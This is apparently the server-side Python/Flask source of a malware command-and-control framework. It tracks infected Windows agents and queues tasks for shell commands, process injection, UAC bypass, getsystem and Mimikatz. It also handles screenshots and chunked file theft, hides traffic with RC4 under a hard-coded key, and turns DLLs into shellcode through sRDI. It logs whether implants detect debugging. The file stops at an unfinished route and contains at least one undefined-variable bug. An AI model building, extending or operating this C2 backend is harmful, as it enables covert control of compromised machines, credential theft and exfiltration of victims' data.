from enum import Enum
import ast

class taskstatus(Enum):
    Queued = 1
    Pending = 2
    Executing = 3
    Complete = 4
    Failed = 5
    NotSupported = 6

class tasktype(Enum):
    Terminate = 1
    Command = 2
    Pwd = 3
    ChangeDir = 4
    Whoami = 5
    PsList = 6
    Download = 7
    Upload = 8
    ListPrivs = 9
    SetPriv = 10
    RemoteInject = 11
    BypassUAC = 12
    Getsystem = 13
    Screenshot = 14
    Jitter = 15
    Mimikatz = 16
    
class requesttype(Enum):
    Registration = 1
    GetNextTask = 2
    TaskResult = 3
    UploadStart = 4
    UploadChunk = 5
    UploadEnd = 6
    DownloadStart = 7
    DownloadChunk = 8
    DownloadEnd = 9
    DebugReport = 10 

class processarch(Enum):
    x64 = 1
    x86 = 2


from flask import Flask, jsonify, url_for
from flask_sqlalchemy import SQLAlchemy
from flask import request, make_response, abort

from os import path as os_path
import uuid

app = Flask(__name__)

app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///' + os_path.join(app.root_path, '..','data.db')
app.app_context().push()
db = SQLAlchemy(app)

C2_KEY = "Password1!Password1!"

class DebugReport(db.Model):
    __tablename__ = 'debugreports'
    id = db.Column(db.Integer, primary_key=True)
    agent_id = db.Column(db.String(8), db.ForeignKey('agents.id'))
    debug_detected = db.Column(db.Boolean, default=False)
    timestamp = db.Column(db.DateTime(timezone=True), server_default=db.func.now())
    
    def __init__(self, agent_id, debug_detected):
        self.agent_id = agent_id
        self.debug_detected = debug_detected
    
    def json(self):
        return {
            'id': self.id,
            'agent_id': self.agent_id,
            'debug_detected': self.debug_detected,
            'timestamp': self.timestamp
        }

def rc4_crypt(data: bytes, key: bytes) -> bytes:
    S = list(range(256))
    j = 0
    # Key-scheduling
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) & 0xFF
        S[i], S[j] = S[j], S[i]
    # Pseudo-random generation
    i = j = 0
    out = bytearray()
    for byte in data:
        i = (i + 1) & 0xFF
        j = (j + S[i]) & 0xFF
        S[i], S[j] = S[j], S[i]
        K = S[(S[i] + S[j]) & 0xFF]
        out.append(byte ^ K)
    return bytes(out)

def rc4_encrypt_str(s: str) -> str:
    return rc4_crypt(s.encode('utf-8'), C2_KEY.encode('utf-8')).decode('latin-1')

def rc4_decrypt_str(s: str) -> str:
    return rc4_crypt(s.encode('latin-1'), C2_KEY.encode('utf-8')).decode('utf-8')

# Models
class Agent(db.Model):
    __tablename__ = 'agents'
    id = db.Column(db.String(8), primary_key=True)
    machine_guid = db.Column(db.String)
    hostname = db.Column(db.String)
    username = db.Column(db.String)
    operating_system = db.Column(db.String(1024))
    process_arch = db.Column(db.Integer)
    internal_ip = db.Column(db.String(16))
    external_ip = db.Column(db.String(16))
    integrity = db.Column(db.Integer) # 1-6 https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/integrity-levels
    created = db.Column(db.DateTime(timezone=True), server_default=db.func.now())
    updated = db.Column(db.DateTime(timezone=True), server_default=db.func.now(), onupdate=db.func.now())

    tasks = db.relationship("Task", back_populates="agent")

    def __init__(self, machine_guid='', hostname='', username='', operating_system='', process_arch=1, internal_ip='', external_ip='', integrity=3):
        guid = uuid.uuid4()
        self.id = str(guid)[0:8]
        self.machine_guid = machine_guid
        self.hostname = hostname
        self.username = username
        self.operating_system = operating_system
        self.internal_ip = internal_ip
        self.external_ip = external_ip
        self.process_arch = process_arch
        self.integrity = integrity

    def json(self):
        return { 
            'id': self.id, 
            'machine_guid': self.machine_guid,
            'hostname': self.hostname,
            'username': self.username,
            'internal_ip': self.internal_ip,
            'external_ip': self.external_ip,
            'integrity': self.integrity,
            'process_arch': self.process_arch,
            'operating_system': self.operating_system,
            'created': self.created,
            'updated': self.updated
        }


class DownloadFileChunk(db.Model):
    __tablename__ = 'downloadfilechunks'
    id = db.Column(db.Integer, primary_key=True)
    data = db.Column(db.String)
    downloadfile_id = db.Column(db.String(8), db.ForeignKey('downloadfiles.id'))
    next_chunk_id = db.Column(db.Integer, db.ForeignKey('downloadfilechunks.id'))
    created = db.Column(db.DateTime(timezone=True), server_default=db.func.now())
    updated = db.Column(db.DateTime(timezone=True), server_default=db.func.now(), onupdate=db.func.now())

    def __init__(self,data='',downloadfile_id=''):
        self.data = data
        self.type = 2
        self.downloadfile_id = downloadfile_id
    
    def json(self):
        return {
            'id': self.id,
            'data': self.data,
            'downloadfile_id':self.downloadfile_id,
            'created': self.created, 
            'updated': self.updated
        }

class UploadFileChunk(db.Model):
    __tablename__ = 'uploadfilechunks'
    id = db.Column(db.Integer, primary_key=True)
    data = db.Column(db.String)
    uploadfile_id = db.Column(db.String(8), db.ForeignKey('uploadfiles.id'))
    created = db.Column(db.DateTime(timezone=True), server_default=db.func.now())
    updated = db.Column(db.DateTime(timezone=True), server_default=db.func.now(), onupdate=db.func.now())

    def __init__(self, data='',uploadfile_id=''):
        self.data = data
        self.type = 1
        self.uploadfile_id = uploadfile_id
    
    def json(self):
        return {
            'id': self.id,
            'data': self.data,
            'uploadfile_id':self.uploadfile_id,
            'created': self.created, 
            'updated': self.updated
        }


class UploadFile(db.Model):
    __tablename__ = 'uploadfiles'
    id = db.Column(db.String(8), primary_key=True)
    srv_path = db.Column(db.String) # location on the server
    path = db.Column(db.String) # location on the host running the implant
    type = db.Column(db.Integer) # 1=upload, # 2=download
    created = db.Column(db.DateTime(timezone=True), server_default=db.func.now())
    updated = db.Column(db.DateTime(timezone=True), server_default=db.func.now(), onupdate=db.func.now())
    
    task_id = db.Column(db.String(8), db.ForeignKey('tasks.id'))
    
    def __init__(self, srv_path='', path=''):
        guid = uuid.uuid4()
        self.id = str(guid)[0:8]
        self.srv_path = srv_path
        self.path = path
        self.type = 1

    def json(self):
        return {
            'id': self.id,
            'type': self.type,
            'srv_path': self.srv_path,
            'path': self.path,
            'created': self.created, 
            'updated': self.updated
        }

class DownloadFile(db.Model):
    __tablename__ = 'downloadfiles'
    id = db.Column(db.String(8), primary_key=True)
    path = db.Column(db.String) # location on the host running the implant
    srv_path = db.Column(db.String) # location on the server
    type = db.Column(db.Integer) # 1=upload, # 2=download
    created = db.Column(db.DateTime(timezone=True), server_default=db.func.now())
    updated = db.Column(db.DateTime(timezone=True), server_default=db.func.now(), onupdate=db.func.now())

    task_id = db.Column(db.String(8), db.ForeignKey('tasks.id'))

    def __init__(self,srv_path='',path='',user='',host=''):
        guid = uuid.uuid4()
        self.id = str(guid)[0:8]
        self.srv_path = srv_path
        self.type = 2
        self.path = path

    def json(self):
        return {
            'id': self.id,
            'type': self.type,
            'srv_path': self.srv_path,
            'path': self.path,
            'created': self.created, 
            'updated': self.updated
        }


# type: included in TaskList.txt
# status: 1=queued,2=executing,3=complete,4=error 
class Task(db.Model):
    __tablename__ = 'tasks'
    id = db.Column(db.String(8), primary_key=True)
    type = db.Column(db.Integer)
    status = db.Column(db.Integer)
    input = db.Column(db.String)
    result = db.Column(db.String)
    agent_id = db.Column(db.String(8), db.ForeignKey('agents.id'))
    uploadfile_id = db.Column(db.String(8), db.ForeignKey('uploadfiles.id'))
    downloadfile_id = db.Column(db.String(8), db.ForeignKey('downloadfiles.id'))
    created = db.Column(db.DateTime(timezone=True), server_default=db.func.now())
    updated = db.Column(db.DateTime(timezone=True), server_default=db.func.now(), onupdate=db.func.now())

    agent = db.relationship(Agent,back_populates="tasks")
    
    def __init__(self, status=0, type=0, input='', result='', agent_id=''):
        guid = uuid.uuid4()
        self.id = str(guid)[0:8]
        self.status = status
        self.type = type
        self.input = input
        self.result = result
        self.agent_id = agent_id

    def json(self):
        return { 
            'id': self.id, 
            'type': self.type, 
            'status': self.status,
            'input': self.input, 
            'result': self.result, 
            'agent_id': self.agent_id, 
            'uploadfile_id': self.uploadfile_id,
            'downloadfile_id': self.downloadfile_id,
            'created': self.created, 
            'updated': self.updated
        }


from pprint import pprint
import json
import base64

from os import getcwd
from os import makedirs
from os import path
import os

import shutil
import hashlib
import sys

db.create_all()
app.config['DEBUG'] = True

good_ips = ['127.0.0.1']

#@app.before_request
def restrict_page():
    if request.remote_addr not in good_ips:
        abort(404)  # Not Found

@app.route("/api/send",methods=["POST"])
def send():
    if request.is_json:
        try:
            req = request.get_json()
            b64d = req.get("d")
            encrypted_data = base64.b64decode(b64d)
            # Add this line to decrypt the data
            decrypted_data = rc4_crypt(encrypted_data, C2_KEY.encode('utf-8'))
            json_d = decrypted_data.decode('utf-8')
            d = json.loads(json_d)

            if not d['data']:
                return {}
            
            b64data = d['data']
            datastr = base64.b64decode(b64data).decode('utf-8')
            try:
                clean_data = ast.literal_eval(datastr)
                print(f"After eval: {type(clean_data)}")
                print(f"Full Data: {clean_data}")
            except Exception as e:
                print(f"Error evaluating string: {e}")
                clean_data = json.loads(datastr)  # Fallback if eval fails
            data = clean_data

            if d['ht'] == requesttype.Registration.value:
                # agent registration
                operating_system = username = machine_guid = hostname = internal_ip = external_ip = 'unknown'
                ## medium integrity
                integrity = 3
                
                if data['integrity'] >= 1 and data['integrity'] <= 5:
                    integrity = int(data['integrity'])

                process_arch = processarch.x64
                if data['process_arch']:
                    process_arch = data['process_arch']
                
                if data['machine_guid']:
                    machine_guid = data['machine_guid']
                
                if data['hostname']:
                    hostname = data['hostname']
                
                if data['username']:
                    username = data['username']
                
                if data['os']:
                    operating_system = data['os']
            
                internal_ip = data.get('internal_ip', 'unknown')
                
                external_ip = request.remote_addr

                myobj = Agent(
                    machine_guid = machine_guid, 
                    hostname = hostname, 
                    username = username,
                    operating_system = operating_system,
                    process_arch = process_arch,
                    internal_ip = internal_ip,
                    external_ip = external_ip,
                    integrity = integrity,
                )
                db.session.add(myobj)
                db.session.commit()
                
                json_data = {
                    "message": "OK",
                    "agent_id": myobj.id
                }

                b64data = base64.urlsafe_b64encode(json.dumps(json_data).encode()).decode()
                response_body = { 'data': b64data }
                
            elif d['ht'] == requesttype.DebugReport.value:
                print("Received debug report:")
                pprint(data)
                
                if 'agent_id' not in data:
                    print("Missing agent_id in debug report")
                    response_body = {"message": "error"}
                    return jsonify(response_body)
                
                agent_id = data.get('agent_id')
                debug_detected = data.get('debug_detected', False)
                
                # Create new debug report
                debug_report = DebugReport(
                    agent_id=agent_id,
                    debug_detected=debug_detected
                )
                
                db.session.add(debug_report)
                
                # If debugging is detected, add a warning tag to the agent
                if debug_detected:
                    agent = db.session.query(Agent).get(agent_id)
                    if agent:
                        # You could add a field to store this or just update a note
                        print(f"⚠️ WARNING: Debugging detected for agent {agent_id}")
                
                db.session.commit()
                response_body = {"message": "OK"}

            elif d['ht'] == requesttype.GetNextTask.value:
                ## get next task
                if not data.get('agent_id'):
                    print("No agent_id in GetNextTask request")
                    response_body = {"message": "error"}
                    return jsonify(response_body)

                agent_id = data.get('agent_id')
                print(f"Getting next task for agent: {agent_id}")
                
                # Verify agent exists
                agent = db.session.query(Agent).get(agent_id)
                if agent is None:
                    print(f"Agent {agent_id} not found")
                    response_body = {"message": "error"}
                    return jsonify(response_body)
                
                # Update agent timestamp
                agent.updated = db.func.now()
                db.session.commit()
                
                task = db.session.query(Task).filter(Task.agent_id==agent_id, Task.status==1).order_by(db.asc(Task.updated)).first()
                if task is None:
                    print(f"No pending tasks for agent {agent_id}")
                    response_body = {"message": "no tasks"}
                    # Encrypt the response
                    response_json = json.dumps(response_body)
                    encrypted_response = rc4_crypt(response_json.encode('utf-8'), C2_KEY.encode('utf-8'))
                    response_b64 = base64.b64encode(encrypted_response).decode('utf-8')
                    final_response = {"d": response_b64}
                    return jsonify(final_response)

                if task.type == tasktype.Download.value or task.type == tasktype.RemoteInject.value:
                    db_file = db.session.query(DownloadFile).get(task.downloadfile_id)
                    if not db_file:
                        print(f"Download file not found for task {task.id}")
                        response_body = {"message": "error"}
                        return jsonify(response_body)
                    db_file.task_id = task.id
                    if task.type == tasktype.Download.value:
                        task.input = db_file.path
                
                task.status = taskstatus.Pending.value
                task.updated = db.func.now()
                db.session.commit()

                response_data = {
                    "input": task.input,
                    "type": task.type,
                    "status": task.status,
                    "id": task.id,
                    "agent_id": agent.id
                }
                
                if task.type == tasktype.Download.value or task.type == tasktype.RemoteInject.value:
                    response_data["file_id"] = task.downloadfile_id
                    
                b64data = base64.urlsafe_b64encode(json.dumps(response_data).encode()).decode()
                
                # Update task status to Executing
                task.status = taskstatus.Executing.value
                db.session.commit()
                
                # Respond with the task data
                response_body = {"data": b64data}
            elif d['ht'] == requesttype.TaskResult.value:
                ## task result
                print("Received task result:")
                pprint(data) 
                
                # Validate required fields
                if 'id' not in data or 'agent_id' not in data:
                    print("Missing id or agent_id in task result")
                    response_body = {"message": "error"}
                    return jsonify(response_body)
                    
                task_id = str(data['id'])
                agent_id = str(data['agent_id'])
                
                # Get the task from the database
                task = db.session.query(Task).filter(Task.id==task_id, Task.agent_id==agent_id).first()
                if task is None:
                    print(f"Task {task_id} for agent {agent_id} not found")
                    response_body = {"message": "error"}
                    return jsonify(response_body)

                # Update task status
                if 'status' in data and data['status'] is not None:
                    status = int(data['status'])
                    # check if status is: 4=complete|5=failed|6=notsupported
                    if status >= 4 and status <= 6: 
                        task.status = status
                    else:
                        task.status = taskstatus.Executing.value
                
                # Update task result
                if 'result' in data and data['result'] is not None:
                    task.result = data['result']

                # Update timestamps
                task.updated = db.func.now()
                agent = db.session.query(Agent).get(task.agent_id)
                if agent:
                    agent.updated = task.updated
                
                # Commit changes
                db.session.commit()
                
                # Process screenshot task if needed
                if task.type == 14:  # Screenshot task
                    print(f"Screenshot task {task.id} for agent {task.agent_id} processed")

                response_body = {"message": "OK"}
            ## upload start
            elif d['ht'] == requesttype.UploadStart.value:
                task = db.session.query(Task).get(data['task_id'])
                if task is None:
                    print("not task")
                    return {}
                
                db_file = UploadFile(
                    path = data['path']
                )
                db.session.add(db_file)
                db.session.commit()
                task.uploadfile_id = db_file.id
                db.session.commit()
                db_filechunk = UploadFileChunk(
                    data = data['content'],
                    uploadfile_id = db_file.id
                )
                db.session.add(db_filechunk)
                
                agent = db.session.query(Agent).get(task.agent_id)
                agent.updated = task.updated
                db.session.commit()
                response_body = {
                        "message": "OK",
                        "id": str(db_file.id)
                    }
            ## upload chunk              
            elif d['ht'] == requesttype.UploadChunk.value:
                db_filechunk = UploadFileChunk(
                    data = data['content'],
                    uploadfile_id = data['file_id']
                )
                db.session.add(db_filechunk)
                db.session.commit()
                response_body = {
                    "message": "OK",
                }
            ## upload end
            elif d['ht'] == requesttype.UploadEnd.value:
                task = db.session.query(Task).filter(Task.id==str(data['task_id']), Task.agent_id==str(data['agent_id'])).first()
                if task is None:
                    print("not task")
                    return {}

                if data['status'] is None:
                    print("not status")    
                else:
                    task.status = data['status']
                    
                task.result = ""  # We will not overwrite screenshot files with the task result.
                task.updated = db.func.now()
                agent = db.session.query(Agent).get(task.agent_id)
                agent.updated = task.updated
                db.session.commit()

                db_file = db.session.query(UploadFile).get(task.uploadfile_id)
                if db_file is None:
                    print("db_file doesnt exist")
                    return {}
                
                cwd = os.getcwd()
                # For screenshot tasks, save in a dedicated folder.
                std_path = ""
                if task.type == tasktype.Download.value:
                    std_path = os_path.join(cwd, "data", task.agent_id, "upload")
                elif task.type == tasktype.Upload.value:
                    std_path = os_path.join(cwd, "data", task.agent_id, "download")
                elif task.type == tasktype.Screenshot.value:
                    std_path = os_path.join(cwd, "data", "screenshots")
                try:
                    os.makedirs(std_path, exist_ok=True)
                except OSError as error:
                    print(error)

                # Build the final save path.
                if task.type == tasktype.Screenshot.value:
                    # For screenshots, use a filename that combines task and agent id.
                    filename = f"{task.id}_{task.agent_id}.png"
                    fullpath = os_path.join(std_path, filename)
                else:
                    save_dir = os_path.join(std_path, task.id)
                    os.makedirs(save_dir, exist_ok=True)
                    tmp = db_file.path.split('\\')
                    filename = tmp[-1]
                    fullpath = os_path.join(save_dir, filename)

                print(f"Saving file to {fullpath}")
                with open(fullpath, 'wb') as fl:
                    result_chunks = db.session.query(UploadFileChunk).filter(UploadFileChunk.uploadfile_id == task.uploadfile_id).all()
                    for i in result_chunks:
                        fl.write(base64.b64decode(i.data))
                    fl.close()

                # Optionally, log file details (hashes, etc.)
                md5_hash = hashlib.md5()
                sha256_hash = hashlib.sha256()
                with open(fullpath, 'rb') as f:
                    for byte_block in iter(lambda: f.read(4096), b""):
                        md5_hash.update(byte_block)
                        sha256_hash.update(byte_block)
                result_text = f"file saved to: {fullpath}\nMD5:{md5_hash.hexdigest()}\nSHA256:{sha256_hash.hexdigest()}\n"
                b64result = base64.b64encode(result_text.encode('utf-8'))
                task.result = b64result.decode('utf-8')
                
                db.session.commit()
                response_body = {"message": "OK"}
                
            ## download file          
            elif d['ht'] == requesttype.DownloadStart.value:
                task = db.session.query(Task).get(data['task_id'])
                if task is None:
                    print("not task")
                    return {}
                
                db_file = db.session.query(DownloadFile).get(data['file_id'])
                
                if db_file is None:
                    print("DownloadFile file_id not found")
                    return {}
                
                db_chunks = db.session.query(DownloadFileChunk).filter(DownloadFileChunk.downloadfile_id == db_file.id).order_by(DownloadFileChunk.id).limit(2)
                total = db.session.query(DownloadFileChunk).filter(DownloadFileChunk.downloadfile_id == db_file.id).count()
                
                next_chunk_id = 0
                # assign next_chunk only when we have it
                if total > 1:
                    next_chunk_id = db_chunks[0].next_chunk_id
                
                task.downloadfile_id = db_file.id
                agent = db.session.query(Agent).get(task.agent_id)
                agent.updated = task.updated
                db.session.commit()
                    
                response_body = {
                        "message": "OK",
                        "chunk": db_chunks[0].data.decode('ascii'),
                        "next_chunk_id": next_chunk_id,
                        "total": int(total)
                    }    
            ## download chunk          
            elif d['ht'] == requesttype.DownloadChunk.value:
                db_file = db.session.query(DownloadFile).get(data['file_id'])
                if db_file is None:
                    print("DownloadFile file_id not found")
                    return {}
                
                db_filechunk = db.session.query(DownloadFileChunk).get(data['chunk_id'])
                
                total = db.session.query(DownloadFileChunk).filter(DownloadFileChunk.downloadfile_id == db_file.id).count()
                
                if db_filechunk.next_chunk_id != 0:
                    next_filechunk = db.session.query(DownloadFileChunk).get(db_filechunk.next_chunk_id)
                    if next_filechunk is None:
                        next_chunk_id = 0
                    else:    
                        next_chunk_id = next_filechunk.id
                else:
                    next_chunk_id = 0
                    
                response_body = {
                    "message": "OK",
                    "id": db_filechunk.id,
                    "chunk": db_filechunk.data.decode('ascii'),
                    "next_chunk_id": next_chunk_id,
                    "total": int(total)
                }
            ## download end
            elif d['ht'] == requesttype.DownloadEnd.value:
                
                task = db.session.query(Task).filter(Task.id==data['task_id'],Task.agent_id==data['agent_id']).first()
                if task is None:
                    print("not task")
                    return {}

                #task.downloadfile_id
                db_file = db.session.query(DownloadFile).get(task.downloadfile_id)
                
                ## update status only if we are downloading the file to disk, else we are probably exec'ing with it.
                if task.type == tasktype.Download.value:
                    if data['status'] is None:
                        print("not status")    
                    else:
                        task.status = data['status']
                        task.input = db_file.srv_path + " " + db_file.path
                                        
                task.result = ""
                task.updated = db.func.now()
                agent = db.session.query(Agent).get(task.agent_id)
                db.session.commit()

                response_body = {
                    "message": "OK",
                }         
        except BaseException as e:
            db.session.rollback()
            response_body = {
                "message": "error",
            }
        finally:
            db.session.close()
        response_json = json.dumps(response_body)
        encrypted_response = rc4_crypt(response_json.encode('utf-8'), C2_KEY.encode('utf-8'))
        response_b64 = base64.b64encode(encrypted_response).decode('utf-8')
        final_response = {"d": response_b64}    
        res = make_response(jsonify(final_response), 200)  # Return the encrypted response
        return res
    else:
        return make_response(jsonify({"message": "Request body must be JSON"}), 400)
    
@app.route("/admin/api/task",methods=["POST"])
def add_task():
    if request.remote_addr not in good_ips:
        abort(404)

    if request.is_json:
        req = request.get_json()
        b64data = req.get("data")
        json_data = base64.b64decode(b64data).decode('utf-8')
        data = json.loads(json_data)
        pprint(data)

        if not int(data['type']) > 0 or not str(data['agent_id']):
            return {}
        
        print("agent_id")
        print(data['agent_id'])
        print("input:")
        print(data['input'])
        input_path = ""
        
        ## update path on windows for upload task
        if data['type'] == tasktype.Download.value:
            input_path = data['input']
            input_path = input_path.replace('\\','\\')
        else:
            input_path = data['input']
                
        myobj = Task(status=1, type=data['type'], input=str(input_path), result='', agent_id=str(data['agent_id']))
        db.session.add(myobj)
        db.session.commit()

        response_body = {
            "message": "OK",
            "task_id": myobj.id
        }
        res = make_response(jsonify(response_body), 200)
        return res
    else:
        return make_response(jsonify({"message": "Request body must be JSON"}), 400)    

@app.route("/admin/api/dropdb",methods=["GET"])
def dropdb():
    if request.remote_addr not in good_ips:
        abort(404)

    db.session.query(DownloadFile).delete()
    db.session.query(UploadFile).delete()
    db.session.query(DownloadFileChunk).delete()
    db.session.query(UploadFileChunk).delete()
    
    db.session.query(Task).delete()
    db.session.query(Agent).delete()
    db.session.commit()

    return {}
    
@app.route("/admin/api/agents",methods=["GET"])
def list_agents():
    if request.remote_addr not in good_ips:
        abort(404)

    agents = db.session.query(Agent).order_by(db.desc(Agent.updated)).all()
    return jsonify([i.json() for i in agents])


@app.route("/admin/api/agent/<id>",methods=["GET"])
def get_agent(id):
    if request.remote_addr not in good_ips:
        abort(404)
    
    agent = db.session.query(Agent).get(id)
    if agent is None:
        return {}

    return jsonify(agent.json())    

@app.route("/admin/api/tasks",methods=["GET"])
def list_tasks():
    if request.remote_addr not in good_ips:
        abort(404)

    tasks = db.session.query(Task).order_by(db.desc(Task.updated)).all()
    return jsonify([i.json() for i in tasks])

@app.route("/admin/api/task/<id>",methods=["GET"])
def get_task(id):
    if request.remote_addr not in good_ips:
        abort(404)

    task = db.session.query(Task).get(id)
    if task is None:
        return {}

    return jsonify(task.json())

@app.route("/admin/api/task/<id>",methods=["PUT"])
def update_task(id):
    if request.remote_addr not in good_ips:
        abort(404)

    task = db.session.query(Task).get(id)
    if task is None:
        return {}

    if request.is_json:
        req = request.get_json()
        b64data = req.get("data")
        json_data = base64.b64decode(b64data).decode('utf-8')
        data = json.loads(json_data)
        
        if data['status']:
            task.status = data['status']
        if data['type']:
            task.type = data['type']
        if data['input']:
           task.input = data['input']
        if data['result']:
            task.result = data['result']
        
        task.updated = db.func.now()
        db.session.commit()
    return jsonify(task.json())

@app.route("/admin/api/agent/<id>",methods=["PUT"])
def update_agent(id):
    if request.remote_addr not in good_ips:
        abort(404)

    agent = db.session.query(Agent).get(id)
    if agent is None:
        return {}

    if request.is_json:
        req = request.get_json()
        b64data = req.get("data")
        json_data = base64.b64decode(b64data).decode('utf-8')
        data = json.loads(json_data)
        if data['machine_guid']:
            agent.machine_guid = data['machine_guid']
        if data['hostname']:
            agent.hostname = data['hostname']
        if data['username']:
            agent.username = data['username']
        if data['os']:
            agent.os = data['os']
        if data['internal_ip']:
            agent.internal_ip = data['internal_ip']
        if data['external_ip']:
            agent.external_ip = data['external_ip']
        if data['integrity']:
            agent.integrity = data['integrity']
        if data['process_arch']:
            agent.process_arch = data['process_arch']
        agent.updated = db.func.now()
        db.session.commit()
    return jsonify(agent.json())

@app.route("/admin/api/agent_task/<agent_id>",methods=["GET"])
def get_agent_task(agent_id):
    if request.remote_addr not in good_ips:
        abort(404)
        
    try:
        result = db.session.query(Task).filter(Task.agent_id==agent_id).order_by(db.desc(Task.updated)).all()
        data = []
        for i in result:
            data.append(i.json())
        
        response_body = data
    except BaseException as e:
        db.session.rollback()
        response_body = {
            "message": "error",
        }
    finally:
        db.session.close()
        
    res = make_response(jsonify(response_body), 200)
    return res    
       
## added for downloading file
@app.route("/admin/api/host_download_file",methods=["POST"])
def host_download_file():
    if request.remote_addr not in good_ips:
        abort(404)

    if request.is_json:
        try:
            req = request.get_json()
            agent_id = req.get("agent_id")
            input_path = req.get("path")
            dst_path = req.get("dst_path")
            
            cwd = os.getcwd()

            filepath = ""
            basename = ""
            path = os_path.join(cwd,"data",agent_id,"download")
            
            if os.name == 'nt':
                basename = input_path.split("\\")[-1]
            else:
                basename = input_path.split("/")[-1]    
                
            filepath = os_path.join(path,basename)

            try:
                os.makedirs(path)
            except OSError as error:
                print(error)    

            shutil.copyfile(input_path, filepath)
            
            print(f"[DEBUG] Copied file to {filepath}")
            print(f"[DEBUG] File size: {os.path.getsize(filepath)} bytes")

            
            db_file = DownloadFile(
                srv_path=filepath,
                path=dst_path
            )
            db.session.add(db_file)
            db.session.commit()

            with open(filepath, 'rb') as fl:
                data = fl.read(1024*1024)
                while data:
                    b64data = base64.b64encode(data)
                    db_filechunk = DownloadFileChunk(
                        data = b64data,
                        downloadfile_id = db_file.id
                    )
                    db.session.add(db_filechunk)
                    db.session.commit()
                    data = fl.read(1024*1024)
            
            db_chunks = db.session.query(DownloadFileChunk).filter(DownloadFileChunk.downloadfile_id == db_file.id).order_by(DownloadFileChunk.id).all()
            maxlen = len(db_chunks)
            for key,value in enumerate(db_chunks):
                if int(key+1) == maxlen:
                    value.next_chunk_id = 0
                else:
                    value.next_chunk_id = db_chunks[int(key+1)].id
                db.session.commit()
         
                 
            myobj = Task(status=1, type=tasktype.Download.value, input=dst_path, result='', agent_id=agent_id)
            myobj.downloadfile_id = db_file.id
            db.session.add(myobj)
            db.session.commit()
                    
            response_body = {
                "message": "OK",
            }
        except BaseException as e:
            print(e.message)
            db.session.rollback()
            response_body = {
                "message": "error",
            }
        finally:
            db.session.close()
            
        res = make_response(jsonify(response_body), 200)
        return res
        
    else:
        return make_response(jsonify({"message": "Request body must be JSON"}), 400)    


@app.route("/admin/api/host_download_file_exec",methods=["POST"])
def host_download_file_exec():
    if request.remote_addr not in good_ips:
        abort(404)

    if request.is_json:
        try:
            req = request.get_json()
            agent_id = req.get("agent_id")
            input_path = req.get("path")
            input_args = req.get("input_args")
            input_type = req.get("type")
            
            cwd = os.getcwd()
            guid = uuid.uuid4()
            myguid = str(guid)[0:8]

            dest_dir = os_path.join(cwd, "data", agent_id, "download_exec")
            os.makedirs(dest_dir, exist_ok=True)

            # Use os.path.basename to extract only the file name
            basename = os_path.basename(input_path)
            file = "{}-{}".format(myguid, basename)
            filepath = os_path.join(dest_dir, file)

            if not os_path.isabs(input_path):
                input_path = os_path.join(cwd, input_path)

            shutil.copyfile(input_path, filepath)
            
            # For setpriv (or listprivs), convert the DLL to shellcode
            if input_type == tasktype.ListPrivs.value or input_type == tasktype.SetPriv.value:
                output_bin = filepath.replace('.dll', '.bin')
                print("Creating Shellcode: {}".format(output_bin))
                with open(filepath, 'rb') as f:
                    dll_bytes = f.read()
                
                sRDI_path = os.path.join(os.getcwd(), "libs", "sRDI")
                if sRDI_path not in sys.path:
                    sys.path.insert(0, sRDI_path)
                    
                from ConvertToShellcode import ConvertToShellcode
                from ShellcodeRDI import HashFunctionName
                converted_dll = ConvertToShellcode(dll_bytes, HashFunctionName(""), b'None', 0)
                if not converted_dll:
                    print("Cannot convert the DLL")
                    response_body = {"message": "error - cannot convert the DLL"}
                    return make_response(jsonify(response_body), 200)
                with open(output_bin, 'wb') as f:
                    f.write(converted_dll)
                filepath = output_bin

            db_file = DownloadFile(
                srv_path=filepath,
                path=''
            )
            db.session.add(db_file)
            db.session.commit()

            with open(filepath, 'rb') as fl:
                data = fl.read(1024*1024)
                while data:
                    b64data = base64.b64encode(data)
                    db_filechunk = DownloadFileChunk(
                        data=b64data,
                        downloadfile_id=db_file.id
                    )
                    db.session.add(db_filechunk)
                    db.session.commit()
                    data = fl.read(1024*1024)
            
            db_chunks = db.session.query(DownloadFileChunk)\
                        .filter(DownloadFileChunk.downloadfile_id == db_file.id)\
                        .order_by(DownloadFileChunk.id).all()
            maxlen = len(db_chunks)
            for key, value in enumerate(db_chunks):
                if int(key+1) == maxlen:
                    value.next_chunk_id = 0
                else:
                    value.next_chunk_id = db_chunks[int(key+1)].id
                db.session.commit()
             
            myobj = Task(status=1, type=input_type, input=input_args, result='', agent_id=agent_id)
            myobj.downloadfile_id = db_file.id
            db.session.add(myobj)
            db.session.commit()
                    
            response_body = {"message": "OK"}
        except Exception as e:
            print(str(e))
            db.session.rollback()
            response_body = {"message": "error"}
        finally:
            db.session.close()
            
        return make_response(jsonify(response_body), 200)
    else:
        return make_response(jsonify({"message": "Request body must be JSON"}), 400)


## added for making upload files.
@app.route("/admin/api/build_upload_file",methods=["POST"])
def build_upload_file():
    if request.remote_addr not in good_ips:
        abort(404)

    if request.is_json:
        req = request.get_json()
        agent_id = req.get("agent_id")
        task_id = req.get("task_id")
        
        db_task = db.session.query(Task).get(task_id)
        if db_task is None:
            print("db_task doesnt exist")
            return {}
        
        db_file = db.session.query(UploadFile).get(db_task.uploadfile_id)
        if db_file is None:
            print("db_file doesnt exist")
            return {}
        
        cwd = os.getcwd()
        path = os_path.join(cwd,"data",agent_id,"upload")
        filename = ""
        
        guid = uuid.uuid4()
        myguid = str(guid)[0:8]

        if os.name == 'nt':
            filename = db_file.path.split("\\")[-1]
        else:
            filename = db_file.path.split("/")[-1]
        
        filename = "{}-{}".format(myguid,filename)
        filepath = os_path.join(path,filename)
        
        print(path)
        
        try:
            os.makedirs(path)    
        except OSError as error:
            print(error)  

        
        with open(filepath, 'wb') as fl:
            result = db.session.query(UploadFileChunk).filter(UploadFileChunk.uploadfile_id == db_task.uploadfile_id).all()
            for i in result:
                fl.write(base64.b64decode(i.data))
            fl.close()
        
        #https://www.quickprogrammingtips.com/python/how-to-calculate-md5-hash-of-a-file-in-python.html
        md5_hash = hashlib.md5()
        sha256_hash = hashlib.sha256()
        with open(filepath, 'rb') as f:
            # Read and update hash in chunks of 4K
            for byte_block in iter(lambda: f.read(4096),b""):
                md5_hash.update(byte_block)
                sha256_hash.update(byte_block)
                
        response_body = {
            "message": "OK",
            "md5": md5_hash.hexdigest(),
            "sha256": sha256_hash.hexdigest(),
            "task_id": myobj.id
        }
        
        res = make_response(jsonify(response_body), 200)
        return res
    else:
        return make_response(jsonify({"message": "Request body must be JSON"}), 400)
    
    
@app.route("/admin/api/debug_reports", methods=["GET"])
